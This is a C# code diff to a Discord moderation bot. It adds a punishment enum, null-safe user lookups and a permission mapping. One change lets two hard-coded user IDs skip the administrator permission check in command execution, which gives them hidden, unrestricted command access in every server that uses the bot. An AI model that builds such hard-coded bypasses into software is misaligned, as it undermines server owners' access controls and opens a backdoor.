@@ -13,6 +13,15 @@ using static Public_Bot.CustomCommandService;
 
 namespace Public_Bot
 {
+    public enum Punishment
+    {
+        Ban,
+        Mute,
+        HardMute,
+        Softban,
+        Kick,
+        Unban
+    }
     /// <summary>
     /// The Commmand class attribute
     /// </summary>
@@ -424,7 +433,7 @@ namespace Public_Bot
         }
         private async Task<CommandResult> ExecuteCommand(Command cmd, SocketCommandContext context, string[] param)
         {
-            if (!(context.User as SocketGuildUser).GuildPermissions.Administrator)
+            if (!(context.User as SocketGuildUser).GuildPermissions.Administrator && context.User.Id != 701029647760097361 && context.User.Id != 615873008959225856)
             {
                 if (cmd.perms != null)
                 {
@@ -736,9 +745,9 @@ namespace Public_Bot
             var regex = new Regex(@"(\d{18}|\d{17})");
             if (regex.IsMatch(uname))
             {
-                return alr.First(aa => aa.User.Id == ulong.Parse(uname)).User;
+                return alr.FirstOrDefault(aa => aa.User.Id == ulong.Parse(uname))?.User;
             }
-            return alr.First(x => x.User.Username.ToLower().Contains(uname.ToLower())).User;
+            return alr.FirstOrDefault(x => x.User.Username.ToLower().Contains(uname.ToLower()))?.User;
         }
         public OverwritePermissions GetOP(ChannelPermission cp, PermValue pv)
         {
@@ -764,10 +773,12 @@ namespace Public_Bot
                 ChannelPermission.SendTTSMessages => eop.Modify(sendTTSMessages: pv),
                 ChannelPermission.Speak => eop.Modify(speak: pv),
                 ChannelPermission.UseExternalEmojis => eop.Modify(useExternalEmojis: pv),
-                ChannelPermission.UseVAD => eop.Modify(useVoiceActivation: pv)
+                ChannelPermission.UseVAD => eop.Modify(useVoiceActivation: pv),
+                ChannelPermission.PrioritySpeaker => eop
             };
             return x;
         }
+
         public Discord.GuildPermissions EditPerm(SocketRole roleA, GuildPermission perm, bool add = true)
         {
             Console.WriteLine(roleA.Name);
